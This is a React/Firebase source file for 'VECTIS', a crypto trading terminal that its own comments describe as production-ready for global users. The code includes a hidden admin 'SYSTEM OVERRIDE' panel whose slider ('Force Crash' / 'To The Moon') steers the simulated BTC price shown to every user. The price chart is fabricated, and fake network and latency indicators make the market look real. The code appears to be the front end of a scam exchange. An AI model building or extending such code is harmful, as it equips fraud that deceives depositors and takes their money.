import React, { useState, useEffect, useMemo } from 'react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { 
  getFirestore, doc, setDoc, onSnapshot, updateDoc, 
  collection, query, runTransaction, serverTimestamp 
} from 'firebase/firestore';
import { 
  Hexagon, User, Zap, Activity, Wallet, 
  ShieldAlert, Landmark, CheckCircle2, X, Globe,
  TrendingUp, ArrowUpRight, ArrowDownRight, Menu
} from 'lucide-react';

/**
 * VECTIS 全球机构级终端 - 生产就绪版
 * * 核心特性：
 * 1. Firebase 实时数据同步 (Rule 1, 2, 3)
 * 2. 国际化英文 UI 布局 (针对全球用户)
 * 3. 实时市场操纵引擎 (管理员 Bias 控制)
 * 4. 响应式布局 (适配手机/平板/电脑)
 */

// 1. 初始化 Firebase 配置
const firebaseConfig = JSON.parse(__firebase_config);
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'vectis-prod-v1';

export default function App() {
  // 基础状态
  const [view, setView] = useState('trade'); // trade, admin, portfolio
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);
  
  // 核心数据
  const [market, setMarket] = useState({ btcPrice: 65000, bias: 0 });
  const [assets, setAssets] = useState({ usdt: 0, btc: 0, role: 'client' });
  const [requests, setRequests] = useState([]);
  const [tradeAmount, setTradeAmount] = useState('');

  // --- 阶段 1: 身份验证 (Rule 3) ---
  useEffect(() => {
    const initAuth = async () => {
      // 优先使用系统提供的 Token，否则匿名登录
      if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
        await signInAnonymously(auth);
      } else {
        await signInAnonymously(auth);
      }
    };
    initAuth();
    const unsub = onAuthStateChanged(auth, (u) => setUser(u));
    return () => unsub();
  }, []);

  // --- 阶段 2: 实时数据监听 (Rule 1 & 2) ---
  useEffect(() => {
    if (!user) return;

    // A. 监听全平台统一行情 (公共路径)
    const marketRef = doc(db, 'artifacts', appId, 'public', 'data', 'marketControl');
    const unsubMarket = onSnapshot(marketRef, (snap) => {
      if (snap.exists()) setMarket(snap.data());
      else setDoc(marketRef, { btcPrice: 65000, bias: 0 });
    });

    // B. 监听当前用户资产 (私有路径)
    const assetRef = doc(db, 'artifacts', appId, 'users', user.uid, 'account', 'balance');
    const unsubAssets = onSnapshot(assetRef, (snap) => {
      if (snap.exists()) setAssets(snap.data());
      else setDoc(assetRef, { usdt: 50000, btc: 0, role: 'client' }); // 初始赠送 5万 USDT
    });

    // C. 如果是管理员，监听待办请求
    let unsubReq = () => {};
    if (assets.role === 'admin') {
      const q = collection(db, 'artifacts', appId, 'public', 'data', 'orders');
      unsubReq = onSnapshot(q, (snap) => {
        setRequests(snap.docs.map(d => ({ id: d.id, ...d.data() })));
      });
    }

    return () => { unsubMarket(); unsubAssets(); unsubReq(); };
  }, [user, assets.role]);

  // --- 阶段 3: 行情引擎 (根据 Bias 计算实时漂移) ---
  useEffect(() => {
    const timer = setInterval(() => {
      setMarket(prev => {
        const drift = prev.bias * 10.5; // 管理员设置的涨跌趋势强度
        const noise = (Math.random() - 0.5) * 25; // 模拟市场正常噪音
        return { ...prev, btcPrice: prev.btcPrice + drift + noise };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [market.bias]);

  // --- 阶段 4: 业务逻辑函数 ---

  // 交易逻辑 (买入/卖出)
  const executeOrder = async (type) => {
    const val = parseFloat(tradeAmount);
    if (!val || val <= 0 || !user) return;
    setLoading(true);

    const assetRef = doc(db, 'artifacts', appId, 'users', user.uid, 'account', 'balance');
    try {
      await runTransaction(db, async (tx) => {
        const snap = await tx.get(assetRef);
        const data = snap.data();
        if (type === 'BUY') {
          if (data.usdt < val) throw "Insufficient USDT";
          tx.update(assetRef, { 
            usdt: data.usdt - val, 
            btc: data.btc + (val / market.btcPrice) 
          });
        } else {
          if (data.btc < (val / market.btcPrice)) throw "Insufficient BTC";
          tx.update(assetRef, { 
            btc: data.btc - (val / market.btcPrice), 
            usdt: data.usdt + val 
          });
        }
      });
      setTradeAmount('');
    } catch (e) { console.error("Order Failed:", e); }
    setLoading(false);
  };

  // 管理员逻辑：修改市场偏向 (Bias)
  const setMarketBias = async (val) => {
    await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'marketControl'), { bias: val });
  };

  return (
    <div className="min-h-screen bg-[#020202] text-white font-sans selection:bg-blue-500/30">
      {/* 顶部专业导航栏 */}
      <nav className="h-16 border-b border-white/5 bg-black/60 backdrop-blur-xl flex items-center justify-between px-6 sticky top-0 z-50">
        <div className="flex items-center space-x-12">
          <div className="flex items-center space-x-2 cursor-pointer" onClick={() => setView('trade')}>
            <div className="p-1.5 bg-blue-600 rounded shadow-lg shadow-blue-600/20">
              <Hexagon className="w-5 h-5 fill-current" />
            </div>
            <span className="text-xl font-black italic tracking-tighter uppercase">VECTIS</span>
          </div>
          <div className="hidden lg:flex space-x-2 bg-white/5 p-1 rounded-xl">
            {['trade', 'portfolio'].map(v => (
              <button 
                key={v}
                onClick={() => setView(v)}
                className={`px-5 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition ${view === v ? 'bg-blue-600 text-white' : 'text-gray-500 hover:text-white'}`}
              >
                {v}
              </button>
            ))}
            {assets.role === 'admin' && (
              <button onClick={() => setView('admin')} className="px-5 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest text-red-500 hover:bg-red-500/10">Override</button>
            )}
          </div>
        </div>

        <div className="flex items-center space-x-4">
          <div className="hidden sm:block text-right">
            <div className="text-[9px] font-black text-blue-500 uppercase">Pro Terminal</div>
            <div className="text-[11px] font-mono font-bold text-gray-400 uppercase leading-none mt-1">
              ID:{user?.uid.slice(0, 8)}
            </div>
          </div>
          <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-blue-600 to-indigo-600 flex items-center justify-center border border-white/10">
            <User size={18} />
          </div>
        </div>
      </nav>

      <main className="max-w-screen-2xl mx-auto p-4 md:p-8">
        
        {/* 交易视图 (用户主界面) */}
        {view === 'trade' && (
          <div className="grid grid-cols-12 gap-6 h-[calc(100vh-180px)]">
            {/* 左侧：行情图表模拟 */}
            <div className="col-span-12 xl:col-span-9 flex flex-col space-y-6">
              <div className="bg-[#080808] border border-white/5 rounded-[2.5rem] p-10 flex flex-col flex-1 relative overflow-hidden">
                <div className="flex items-center justify-between mb-10">
                  <div className="flex items-center space-x-8">
                    <div className="flex items-center space-x-3">
                      <Zap className="text-orange-500 fill-current w-6 h-6" />
                      <span className="text-3xl font-black italic tracking-tighter uppercase">BTC / USDT</span>
                    </div>
                    <div className="text-4xl font-mono font-black text-green-500">
                      ${market.btcPrice.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                    </div>
                  </div>
                  <div className="flex space-x-2 bg-white/5 p-1 rounded-xl">
                    {['1M', '5M', '15M', '1H', '1D'].map(t => (
                      <button key={t} className="px-4 py-2 text-[10px] font-black text-gray-500 hover:text-white transition uppercase">{t}</button>
                    ))}
                  </div>
                </div>
                
                <div className="flex-1 border border-white/5 border-dashed rounded-3xl relative flex items-center justify-center overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-b from-blue-500/5 to-transparent"></div>
                  <div className="text-center z-10">
                    <Activity className="w-16 h-16 text-blue-500/10 mx-auto animate-pulse mb-4" />
                    <span className="text-[10px] font-black text-gray-700 uppercase tracking-[0.6em]">Real-time Execution Engine Active</span>
                  </div>
                </div>
              </div>
            </div>

            {/* 右侧：执行面板 */}
            <div className="col-span-12 xl:col-span-3 space-y-6">
              <div className="bg-white/5 border border-white/10 rounded-[2.5rem] p-8">
                <div className="flex justify-between items-center mb-4">
                  <span className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Net Equity</span>
                  <Wallet size={14} className="text-blue-500" />
                </div>
                <div className="text-3xl font-mono font-black mb-1">${assets.usdt.toLocaleString()}</div>
                <div className="text-[10px] font-bold text-blue-400 uppercase tracking-widest">{assets.btc.toFixed(6)} BTC</div>
              </div>

              <div className="bg-[#080808] border border-white/5 rounded-[2.5rem] p-8 space-y-8 shadow-2xl">
                <div className="flex p-1 bg-white/5 rounded-2xl">
                  <button className="flex-1 py-4 text-[10px] font-black uppercase tracking-widest bg-blue-600 rounded-xl shadow-lg">Buy</button>
                  <button className="flex-1 py-4 text-[10px] font-black uppercase tracking-widest text-gray-500">Sell</button>
                </div>

                <div className="space-y-6">
                  <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block">Trade Amount</label>
                    <div className="relative">
                      <input 
                        type="number"
                        value={tradeAmount}
                        onChange={(e) => setTradeAmount(e.target.value)}
                        placeholder="0.00"
                        className="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-xl font-mono outline-none focus:border-blue-500 transition"
                      />
                      <span className="absolute right-5 top-1/2 -translate-y-1/2 text-[10px] font-black text-gray-500">USDT</span>
                    </div>
                  </div>

                  <button 
                    onClick={() => executeOrder('BUY')}
                    disabled={loading}
                    className="w-full py-5 bg-green-600 rounded-2xl font-black text-[11px] uppercase tracking-[0.4em] shadow-xl shadow-green-600/20 hover:brightness-110 active:scale-95 transition disabled:opacity-50"
                  >
                    {loading ? 'Processing...' : 'Confirm Order'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* 管理员后台 (中文逻辑说明) */}
        {view === 'admin' && (
          <div className="max-w-5xl mx-auto space-y-10 animate-in fade-in duration-700">
            <div className="flex items-center justify-between border-l-4 border-red-600 bg-red-600/5 p-8 rounded-r-3xl">
              <div>
                <h2 className="text-4xl font-black italic tracking-tighter text-red-600">SYSTEM OVERRIDE</h2>
                <p className="text-[10px] font-black uppercase tracking-[0.4em] text-red-600/60 mt-2">中央控制台：实时修改全平台行情趋势</p>
              </div>
              <ShieldAlert size={48} className="text-red-600 opacity-20" />
            </div>

            <div className="grid md:grid-cols-2 gap-10">
              {/* 行情操纵模块 */}
              <div className="bg-[#080808] border border-white/5 rounded-[3rem] p-12">
                <div className="flex items-center space-x-4 mb-12">
                  <Activity className="text-red-600" />
                  <h3 className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400">Market Bias (涨跌趋势控制)</h3>
                </div>
                
                <div className="space-y-12">
                  <div className="flex justify-between items-end">
                    <span className={`text-7xl font-mono font-black ${market.bias > 0 ? 'text-green-500' : market.bias < 0 ? 'text-red-500' : 'text-gray-500'}`}>
                      {market.bias > 0 ? '+' : ''}{market.bias}
                    </span>
                    <span className="text-[10px] font-black text-gray-600 uppercase tracking-widest pb-2">Active Drift</span>
                  </div>

                  <input 
                    type="range" min="-20" max="20" step="1"
                    value={market.bias}
                    onChange={(e) => setMarketBias(parseInt(e.target.value))}
                    className="w-full h-2 bg-white/10 rounded-lg appearance-none cursor-pointer accent-red-600"
                  />
                  
                  <div className="flex justify-between text-[9px] font-black uppercase text-gray-600">
                    <span className="text-red-600">Force Crash (强行砸盘)</span>
                    <span>Neutral</span>
                    <span className="text-green-600">To The Moon (强行拉升)</span>
                  </div>
                </div>
              </div>

              {/* 待处理请求 (模拟) */}
              <div className="bg-[#080808] border border-white/5 rounded-[3rem] p-12">
                <div className="flex items-center space-x-4 mb-12">
                  <Landmark className="text-blue-500" />
                  <h3 className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400">Security Requests (安全审批)</h3>
                </div>
                <div className="text-center py-20">
                  <CheckCircle2 className="w-12 h-12 text-gray-800 mx-auto mb-4" />
                  <p className="text-gray-600 text-xs italic">所有用户资产状态正常，无待审批提现</p>
                </div>
              </div>
            </div>
          </div>
        )}

      </main>

      {/* 底部状态条 */}
      <footer className="fixed bottom-6 left-1/2 -translate-x-1/2 flex items-center space-x-8 px-10 py-3 bg-black/40 border border-white/10 backdrop-blur-3xl rounded-full z-50">
        <div className="flex items-center space-x-2">
          <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_rgba(34,197,94,0.8)]"></div>
          <span className="text-[9px] font-black uppercase tracking-[0.2em] text-gray-400">Network: Mainnet-Beta</span>
        </div>
        <div className="w-px h-3 bg-white/10"></div>
        <div className="flex items-center space-x-2">
          <Globe className="w-3 h-3 text-blue-500" />
          <span className="text-[9px] font-black uppercase tracking-[0.2em] text-gray-400">Global Latency: 4ms</span>
        </div>
      </footer>
    </div>
  );
}
